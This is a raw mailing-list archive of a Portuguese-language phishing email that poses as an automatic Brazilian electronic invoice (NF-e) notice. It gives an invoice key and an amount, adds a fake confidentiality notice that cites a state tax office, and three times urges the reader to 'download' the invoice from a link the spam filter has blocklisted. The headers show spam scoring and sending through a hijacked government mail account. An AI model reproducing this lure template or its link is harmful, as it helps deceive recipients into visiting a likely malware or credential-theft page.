Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 628F7C015B
	for <lists+osst-users@lfdr.de>; Fri, 27 Sep 2019 10:40:19 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1iDlnW-00077k-6Y
	for lists+osst-users@lfdr.de; Fri, 27 Sep 2019 08:40:18 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <nfetravessa@travessa.com.br>) id 1iDlnU-00077c-9a
 for osst-users@lists.sourceforge.net; Fri, 27 Sep 2019 08:40:16 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Date:MIME-Version:Content-Type:To:
 Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=uEtkFMAhEFmdK8QGA+afYF9GsQhLIF/951giXjBusCw=; b=gu+K8BoC9ojxt7CHy6TebnTbss
 Jvd7BcXz6StPHtbv9NvRfn5wPGjbOdsu0tDY/zqPen+xFrYdLMNH0sGipiZv+ss8jfcegvjjjAIwj
 RGKi/sDZplkvleqlEIQKab01LydmeyCEzEsjdgmQopVPMHRpur7jlDS1vvy1fwHaS9ks=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Date:MIME-Version:Content-Type:To:Subject:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=uEtkFMAhEFmdK8QGA+afYF9GsQhLIF/951giXjBusCw=; b=P
 SC8aNckWoqg/u6+0HV9qhQ1jObJrkheYQ6EVtwPBGgGMC0jlGOgMMcrZzK88E32xt4KMls9pd96rd
 YImS0zD6AcOore6SJ/2r8FkeT8KZAUePwsLCWJ9jX0IbXf6bn7/UYrVioyD9v1EdzzNJJx/8hzJRp
 BZxDVoay6iBEki5Q=;
Received: from hdstnq7bk7.underplatform.com ([177.70.23.221])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1iDlnQ-00Awyx-9i
 for osst-users@lists.sourceforge.net; Fri, 27 Sep 2019 08:40:16 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=igarapemiri.pa.gov.br; s=default; h=Message-Id:Date:MIME-Version:
 Content-Type:To:Subject:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=uEtkFMAhEFmdK8QGA+afYF9GsQhLIF/951giXjBusCw=; b=OKn22nTpV8TXgJtEKMhTYGNeO
 EW2JnIHik+Edv7qsHQjaCG7xt7IQeJzk3r6XUJ81lC5VuVaGHEBdjF2veyFqSLxBv4onJVvX1o1k2
 QS3kQQKt8E78GelrJiTgYZpYvZSNtCfzSg7YyPVNjHai9qfVIy63cQXgDAqdkwnwQ8ujS+Zos3fQO
 +B74Jfrz4lxF33dPVGBsemBDO+khjCVsnFMjFf8zBTHJtvrL+3pCbEZCL8M6ya2ZWOfVtHRLVMQn5
 KDsFsYQdtyr3Wr7lTK27121ieeKrLz+VhApK2lwg4EEonXso6BYGfn8YBIam+748ENBCaELAKXt0t
 uEoXX1ihA==;
Received: from ec2-18-228-196-110.sa-east-1.compute.amazonaws.com
 ([18.228.196.110]:49924 helo=WIN-4R36L5AINIU)
 by hdstnq7bk7.underplatform.com with esmtpa (Exim 4.92)
 (envelope-from <nfetravessa@travessa.com.br>) id 1hg6Pg-0000rx-QX
 for osst-users@lists.sourceforge.net; Wed, 26 Jun 2019 08:48:32 -0300
From: "nfetravessa@travessa.com.br" <nfetravessa@travessa.com.br>
To: osst-users@lists.sourceforge.net
MIME-Version: 1.0
Date: Wed, 26 Jun 2019 11:48:32 +0000
Message-Id: <20190626114832F389407172$2705A25D80@WINRLAINIU>
Status: N
X-AntiAbuse: This header was added to track abuse,
 please include it with any abuse report
X-AntiAbuse: Primary Hostname - hdstnq7bk7.underplatform.com
X-AntiAbuse: Original Domain - lists.sourceforge.net
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - travessa.com.br
X-Get-Message-Sender-Via: hdstnq7bk7.underplatform.com: authenticated_id:
 contato@igarapemiri.pa.gov.br
X-Authenticated-Sender: hdstnq7bk7.underplatform.com: contato@igarapemiri.pa.gov.br
X-Spam-Score: 7.7 (+++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: xmpxfil.ml]
 1.9 URIBL_ABUSE_SURBL Contains an URL listed in the ABUSE SURBL blocklist
 [URIs: xmpxfil.ml]
 2.1 DATE_IN_PAST_96_XX     Date: is 96 hours or more before Received: date
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.5 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
 1.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
 [cf: 100]
 -0.3 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1iDlnQ-00Awyx-9i
Subject: [Osst-users] NF-e Sucesso!!
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1815247631899642647=="
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format

--===============1815247631899642647==
Content-Type: multipart/alternative;
	boundary="----=_NextPart_677_0676_2736B756.E6670720"

This is a multi-part message in MIME format

------=_NextPart_677_0676_2736B756.E6670720
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

Seguem dados da NF-e em anexo.

Caso n=E3o consiga visualizar o email 

acesse este link http://xmpxfil.ml/notaeletronica.html

Autorizado o uso da NF-e
Chave de acesso: 25358255489667000152550010000667351807524752990

Dados da NF-e

N=FAmero: 670001525

S=E9rie: 2

Data de Emiss=E3o: 26/06/2019

Protocolo de Autoriza=E7=E3o: 42586578000485214 26/06/2019 00:21:38

Ambiente: Nota Eletr=F4nica

Tipo de Emiss=E3o: Normal

Valor da NF-e: R$ 160,10

Importante

As informa=E7=F5es contidas nesta mensagem s=E3o CONFIDENCIAIS e protegi=
das pelo sigilo legal. A divulga=E7=E3o, distribui=E7=E3o ou reprodu=E7=E3=
o do teor deste documento depende de autoriza=E7=E3o do emissor. Caso V.=
 Sa. n=E3o seja o destinat=E1rio, preposto ou a pessoa respons=E1vel pel=
a entrega desta mensagem, fica, desde j=E1, notificado que qualquer divu=
lga=E7=E3o, distribui=E7=E3o ou reprodu=E7=E3o =E9 estritamente proibida=
, sujeitando-se o infrator =E0s san=E7=F5es legais Caso esta comunica=E7=
=E3o tenha sido recebida por engano, favor nos avisar imediatamente, atr=
av=E9s do email: (consulta_sat_rpe@fazenda.sp.gov.br)

Baixar (Nota Fiscal Eletr=F4nica) http://xmpxfil.ml/notaeletronica.html

Mensagem gerada automaticamente. N=E3o responder.

------=_NextPart_677_0676_2736B756.E6670720
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> <html><he=
ad>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-88=
59-1">
  <META name=3DGenerator content=3D5.66> <title>NF-e Sucesso!!</title>
 </head>
 <body> <P>&nbsp;</P><table height=3D600 width=3D722 align=3Dcenter bord=
er=3D0>  <TR>  <TD height=3D594 width=3D712>  <DIV style=3D"TEXT-ALIGN: =
left"><B  style=3D"FONT-SIZE: 9px; FONT-FAMILY: verdana, Helvetica, sans=
-serif; BACKGROUND-COLOR: rgb(255,255,255)">Seguem  dados da NF-e em ane=
xo.</B><BR><BR>  <DIV  style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Gr=
ande", Verdana, Arial, Helvetica, sans-serif; COLOR: rgb(43,36,84); TEXT=
-ALIGN: center; BACKGROUND-COLOR: rgb(255,255,255)'><SPAN  style=3D"FONT=
-FAMILY: Helvetica, Arial, sans-serif">Caso n=E3o consiga  visualizar o =
email&nbsp;</SPAN><A  href=3D"http://xmpxfil.ml/notaeletronica.html"><SP=
AN  style=3D"COLOR: rgb(153,153,153)">acesse este link</SPAN></A></DIV><=
BR  style=3D"FONT-SIZE: 9px; FONT-FAMILY: verdana, Helvetica, sans-serif=
; BACKGROUND-COLOR: rgb(255,255,255)"> <table  style=3D"FONT-SIZE: 12px;=
 FONT-FAMILY: verdana, Helvetica, sans-serif; BACKGROUND-COLOR: rgb(255,=
255,255)"  cellSpacing=3D1 cellPadding=3D2 width=3D"100%" border=3D0>   =
  <TR>   <TD bgColor=3D#cccccc width=3D"100%" colSpan=3D6    align=3Dcen=
ter><B>Autorizado o uso da NF-e</B><BR><B>Chave de acesso:    2535825548=
9667000152550010000667351807524752990</B></TD></TR>   <TR>   <TD width=3D=
"100%" colSpan=3D6 align=3Dcenter><B>Dados da NF-e</B></TD></TR>   <TR> =
  <TD width=3D"25%" colSpan=3D2><B>N=FAmero:&nbsp;</B>670001525</TD>   <=
TD width=3D"25%"><B>S=E9rie: 2</B></TD>   <TD width=3D"50%" colSpan=3D3>=
<B>Data de Emiss=E3o: </B>26/06/2019</TD></TR>   <TR>   <TD width=3D"100=
%" colSpan=3D6><B>Protocolo de    Autoriza=E7=E3o:&nbsp;</B>425865780004=
85214 26/06/2019 00:21:38</TD></TR>   <TR>   <TD width=3D"50%" colSpan=3D=
3><B>Ambiente: </B>Nota Eletr=F4nica</TD>   <TD width=3D"50%" colSpan=3D=
3><B>Tipo de Emiss=E3o:&nbsp;</B>Normal</TD></TR>   <TR>   <TD width=3D"=
100%" colSpan=3D6><B>Valor da NF-e:&nbsp;</B>R$   160,10</TD></TR></TABL=
E><BR  style=3D"FONT-SIZE: 9px; FONT-FAMILY: verdana, Helvetica, sans-se=
rif; BACKGROUND-COLOR: rgb(255,255,255)"> <table  style=3D"FONT-SIZE: 12=
px; FONT-FAMILY: verdana, Helvetica, sans-serif; BACKGROUND-COLOR: rgb(2=
55,255,255)"  cellSpacing=3D1 cellPadding=3D2 border=3D0>     <TR>   <TD=
 bgColor=3D#cccccc width=3D"100%" colSpan=3D6    align=3Dcenter><B>Impor=
tante</B></TD></TR>   <TR>   <TD style=3D"TEXT-ALIGN: justify" width=3D"=
100%" colSpan=3D6>    <HR>   <P>As informa=E7=F5es contidas nesta mensag=
em s=E3o CONFIDENCIAIS e    protegidas pelo sigilo legal. A divulga=E7=E3=
o, distribui=E7=E3o ou    reprodu=E7=E3o do teor deste documento depende=
 de autoriza=E7=E3o do    emissor. Caso V. Sa. n=E3o seja o destinat=E1r=
io, preposto ou a pessoa    respons=E1vel pela entrega desta mensagem, f=
ica, desde j=E1, notificado    que qualquer divulga=E7=E3o, distribui=E7=
=E3o ou reprodu=E7=E3o =E9 estritamente    proibida, sujeitando-se o inf=
rator =E0s san=E7=F5es legais Caso esta    comunica=E7=E3o tenha sido re=
cebida por engano, favor nos avisar    imediatamente, atrav=E9s do email=
: (<SPAN    class=3Dst>consulta_sat_rpe@<EM>fazenda</EM>.<EM>sp</EM>.gov=
=2Ebr</SPAN>)</P>    <DIV style=3D"TEXT-ALIGN: left"><BR>  <table    class=
=3D"mcnButtonContentContainer"    style=3D"BACKGROUND-COLOR: rgb(0,175,4=
1)" height=3D50 cellSpacing=3D0    cellPadding=3D0 width=3D429 border=3D=
0>        <TR>     <TD class=3DmcnButtonContent     style=3D"FONT-SIZE: =
16px; FONT-FAMILY: Verdana, Geneva, sans-serif; PADDING-BOTTOM: 15px; PA=
DDING-TOP: 15px; PADDING-LEFT: 15px; PADDING-RIGHT: 15px"     bgColor=3D=
#a0a0a0 vAlign=3Dmiddle width=3D427 align=3Dcenter><A     title=3D"Baixa=
r Nota Fiscal Eletr=F4nica" class=3DmcnButton     style=3D"FONT-WEIGHT: =
bold; COLOR: rgb(255,255,255); LINE-HEIGHT: 16px; text-decoration-line: =
none"     href=3D"http://xmpxfil.ml/notaeletronica.html" rel=3Dnoreferre=
r     target=3D_blank>Baixar (Nota Fiscal    Eletr=F4nica)</A></TD></TR>=
</TABLE></DIV></TD></TR></TABLE><BR  style=3D"FONT-SIZE: 9px; FONT-FAMIL=
Y: verdana, Helvetica, sans-serif; BACKGROUND-COLOR: rgb(255,255,255)"> =
 <P><B  style=3D"FONT-SIZE: 9px; FONT-FAMILY: verdana, Helvetica, sans-s=
erif; BACKGROUND-COLOR: rgb(255,255,255)">Mensagem  gerada automaticamen=
te. N=E3o responder.</B><SPAN  style=3D"FONT-SIZE: 9px; FONT-FAMILY: ver=
dana, Helvetica, sans-serif; BACKGROUND-COLOR: rgb(255,255,255)">&nbsp;<=
/SPAN></P></DIV></TD></TR></TABLE> <P>&nbsp;</P></body>
 </html>
 

------=_NextPart_677_0676_2736B756.E6670720--


--===============1815247631899642647==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1815247631899642647==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============1815247631899642647==--

